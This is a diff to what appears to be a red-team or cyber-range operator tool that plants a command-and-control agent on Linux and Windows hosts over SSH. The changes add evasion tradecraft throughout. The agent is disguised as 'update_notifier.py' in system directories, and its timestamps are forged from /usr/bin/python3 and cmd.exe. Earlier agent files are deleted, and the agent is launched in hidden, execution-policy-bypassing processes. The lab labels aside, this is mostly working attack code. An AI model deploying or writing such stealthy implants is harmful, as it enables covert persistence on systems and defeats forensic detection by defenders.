@@ -171,7 +171,7 @@ def linux_tradecraft(action, opts):
             "while [ \"$i\" -lt 8 ]; do\n"
             "  i=$((i + 1))\n"
             "  if [ ! -r \"/proc/$pid/cmdline\" ]; then break; fi\n"
-            "  if tr '\\0' ' ' < \"/proc/$pid/cmdline\" | grep -q 'range.py'; then agent_pid=$pid; break; fi\n"
+            "  if tr '\\0' ' ' < \"/proc/$pid/cmdline\" | grep -E -q 'range.py|update_notifier.py'; then agent_pid=$pid; break; fi\n"
             "  next=$(awk '/^PPid:/ {{ print $2 }}' \"/proc/$pid/status\")\n"
             "  if [ -z \"$next\" ] || [ \"$next\" = \"$pid\" ] || [ \"$next\" = 0 ]; then break; fi\n"
             "  pid=$next\n"
@@ -592,6 +592,7 @@ class OperatorKit(object):
             if name and name != "defender":
                 patterns.append(name)
         patterns.append("range.py")
+        patterns.append("update_notifier.py")
         seen = []
         for item in patterns:
             if item and item not in seen:
@@ -4081,11 +4082,22 @@ def plant_hosts(doc):
     return chosen
 
 
+LINUX_AGENT_PATH = "/usr/lib/python3/dist-packages/update_notifier.py"
+LINUX_AGENT_PID = "/var/lib/update-notifier/update-notifier.pid"
+LINUX_AGENT_LOG = "/var/log/update-notifier.log"
+LINUX_STAMP_REF = "/usr/bin/python3"
+WIN_AGENT_DIR = "C:/ProgramData/Microsoft/Diagnosis"
+WIN_AGENT_PS1 = WIN_AGENT_DIR + "/update_notifier.ps1"
+WIN_AGENT_PY = WIN_AGENT_DIR + "/update_notifier.py"
+
+
 def linux_agent_start(remote_py, c2, channel, token, sid, profile, ports, zone):
     if remote_py.startswith("$"):
         py = remote_py
+        pyfile = remote_py
     else:
         py = shell_quote(remote_py)
+        pyfile = shell_quote(remote_py)
     rest = [
         "agent",
         "--c2", c2,
@@ -4102,11 +4114,16 @@ def linux_agent_start(remote_py, c2, channel, token, sid, profile, ports, zone):
     ]
     quoted = "python3 {0} {1}".format(py, " ".join(shell_quote(part) for part in rest))
     return (
-        "if [ -f /var/tmp/range-agent.pid ] && kill -0 \"$(cat /var/tmp/range-agent.pid)\" 2>/dev/null; then echo ALREADY; exit 0; fi\n"
-        "setsid {cmd} </dev/null >/var/tmp/range-agent.log 2>&1 &\n"
-        "echo $! >/var/tmp/range-agent.pid\n"
+        "mkdir -p \"$(dirname {pyfile})\" /var/lib/update-notifier\n"
+        "if [ -f /var/tmp/range-agent.pid ]; then kill \"$(cat /var/tmp/range-agent.pid)\" 2>/dev/null || true; rm -f /var/tmp/range-agent.pid /var/tmp/range-agent.log; fi\n"
+        "rm -f /root/range.py \"$HOME/range.py\"\n"
+        "if [ -e {ref} ]; then touch -r {ref} {pyfile}; fi\n"
+        "if [ -f {pid} ] && kill -0 \"$(cat {pid})\" 2>/dev/null; then echo ALREADY; exit 0; fi\n"
+        "setsid {cmd} </dev/null >{log} 2>&1 &\n"
+        "echo $! >{pid}\n"
+        "if [ -e {ref} ]; then touch -r {ref} {log} {pid}; fi\n"
         "echo STARTED\n"
-    ).format(cmd=quoted)
+    ).format(cmd=quoted, pyfile=pyfile, ref=shell_quote(LINUX_STAMP_REF), pid=shell_quote(LINUX_AGENT_PID), log=shell_quote(LINUX_AGENT_LOG))
 
 
 def windows_agent_start(use_python, c2, channel, token, sid, profile, ports, zone):
@@ -4115,7 +4132,7 @@ def windows_agent_start(use_python, c2, channel, token, sid, profile, ports, zon
     sid_q = ps_quote(sid)
     if use_python:
         launch = (
-            "'python','range.py','agent','--c2',{c2},'--channel','{channel}','--token',{token},"
+            "'python',$dest,'agent','--c2',{c2},'--channel','{channel}','--token',{token},"
             "'--id',{sid},'--profile','{profile}','--tcp-port','{tcp}','--http-port','{http}',"
             "'--dns-port','{dns}','--mqtt-port','{mqtt}','--ws-port','{ws}','--zone','{zone}'"
         ).format(
@@ -4124,6 +4141,7 @@ def windows_agent_start(use_python, c2, channel, token, sid, profile, ports, zon
             mqtt=int(ports["mqtt"]), ws=int(ports["ws"]), zone=zone or "lab",
         )
         body = "$p = Start-Process -FilePath python -WindowStyle Hidden -PassThru -ArgumentList @({launch}); ".format(launch=launch)
+        dest_name = "update_notifier.py"
     else:
         launch = (
             "'-NoProfile','-ExecutionPolicy','Bypass','-File',$dest,"
@@ -4134,20 +4152,25 @@ def windows_agent_start(use_python, c2, channel, token, sid, profile, ports, zon
             tcp=int(ports["tcp"]), http=int(ports["http"]), ws=int(ports["ws"]),
         )
         body = (
-            "$dest = Join-Path $env:USERPROFILE 'range-agent.ps1'; "
+            "$dest = Join-Path $env:ProgramData 'Microsoft\\Diagnosis\\update_notifier.ps1'; "
             "$p = Start-Process -FilePath powershell.exe -WindowStyle Hidden -PassThru -ArgumentList @({launch}); "
         ).format(launch=launch)
+        dest_name = "update_notifier.ps1"
     return (
         "powershell.exe -NoProfile -NonInteractive -Command "
-        "\"$pidFile = Join-Path $env:USERPROFILE 'range-agent.pid'; "
-        "if (Test-Path -LiteralPath $pidFile) {{ "
+        "\"$dir = Join-Path $env:ProgramData 'Microsoft\\Diagnosis'; "
+        "New-Item -ItemType Directory -Force -Path $dir | Out-Null; "
+        "$dest = Join-Path $dir '" + dest_name + "'; "
+        "if (Test-Path -LiteralPath $dest) { (Get-Item -LiteralPath $dest).LastWriteTime = (Get-Item -LiteralPath (Join-Path $env:SystemRoot 'System32\\cmd.exe')).LastWriteTime }; "
+        "$pidFile = Join-Path $dir 'update-notifier.pid'; "
+        "if (Test-Path -LiteralPath $pidFile) { "
         "$old = @(Get-Content -LiteralPath $pidFile -ErrorAction SilentlyContinue)[0]; "
-        "if ($old -match '^[0-9]+$' -and (Get-Process -Id ([int]$old) -ErrorAction SilentlyContinue)) {{ Write-Output 'ALREADY'; exit 0 }} "
-        "}}; "
-        "{body}"
+        "if ($old -match '^[0-9]+$' -and (Get-Process -Id ([int]$old) -ErrorAction SilentlyContinue)) { Write-Output 'ALREADY'; exit 0 } "
+        "}; "
+        + body +
         "Set-Content -LiteralPath $pidFile -Value $p.Id; "
         "Write-Output 'STARTED'\""
-    ).format(body=body)
+    )
 
 
 def scp_put(config, alias, local_path, remote_path):
@@ -4176,8 +4199,8 @@ def plant_selfcheck():
     if ids != ["180", "44", "82"]:
         failures.append("plant-id")
     ports = {"tcp": 443, "http": 80, "dns": 53, "mqtt": 1883, "ws": 8070}
-    script = linux_agent_start("/root/range.py", "10.0.0.10", "ws", "lab-token-ok", "180", "continuous", ports, "lab")
-    if "STARTED" not in script or "--id" not in script or "180" not in script:
+    script = linux_agent_start(LINUX_AGENT_PATH, "10.0.0.10", "ws", "lab-token-ok", "180", "continuous", ports, "lab")
+    if "STARTED" not in script or "update_notifier.py" not in script or "touch -r" not in script or "/root/range.py" not in script:
         failures.append("plant-linux")
     if shutil.which("bash"):
         proc = subprocess.Popen(["bash", "-n"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
@@ -4185,7 +4208,7 @@ def plant_selfcheck():
         if proc.returncode != 0:
             failures.append("plant-syntax")
     win = windows_agent_start(False, "10.0.0.10", "ws", "lab-token-ok", "82", "continuous", ports, "lab")
-    if "range-agent.ps1" not in win or "STARTED" not in win or "-Id" not in win:
+    if "update_notifier.ps1" not in win or "STARTED" not in win or "-Id" not in win or "LastWriteTime" not in win:
         failures.append("plant-windows")
     return failures
 
@@ -4246,18 +4269,22 @@ def plant_main(args):
         if host["windows"] and not use_ps1:
             log("{0} is Windows and {1} needs Python there. Copying range.py.".format(host["ip"], channel))
             local_path = linux_src
-            remote_path = "range.py"
+            remote_path = WIN_AGENT_PY
         elif host["windows"]:
             if not os.path.isfile(win_src):
                 log("missing {0}".format(win_src))
                 failed += 1
                 continue
             local_path = win_src
-            remote_path = "range-agent.ps1"
+            remote_path = WIN_AGENT_PS1
         else:
             local_path = linux_src
-            remote_path = "/root/range.py" if host["user"] == "root" else "range.py"
+            remote_path = LINUX_AGENT_PATH if host["user"] == "root" else ".local/lib/python3/dist-packages/update_notifier.py"
         log("---- copy {0} {1} id {2} ----".format(host["alias"], host["ip"], host["sid"]))
+        prep = "mkdir -p \"$(dirname {0})\"".format(shell_quote(remote_path)) if remote_path.startswith("/") else "mkdir -p \"$HOME/.local/lib/python3/dist-packages\""
+        if host["windows"]:
+            prep = "powershell.exe -NoProfile -NonInteractive -Command \"New-Item -ItemType Directory -Force -Path $env:ProgramData\\Microsoft\\Diagnosis | Out-Null\""
+        ssh_exec(args.ssh_config, host["alias"], prep, 20, True)
         code = scp_put(args.ssh_config, host["alias"], local_path, remote_path)
         if code != 0:
             failed += 1
@@ -4266,7 +4293,7 @@ def plant_main(args):
         if host["windows"]:
             command = windows_agent_start(not use_ps1, c2, channel, token, host["sid"], profile, ports, zone)
         else:
-            remote_py = remote_path if remote_path.startswith("/") else "$HOME/range.py"
+            remote_py = remote_path if remote_path.startswith("/") else "$HOME/" + remote_path
             command = linux_agent_start(remote_py, c2, channel, token, host["sid"], profile, ports, zone)
         code, out = ssh_exec(args.ssh_config, host["alias"], command, 40, True)
         if out.strip():
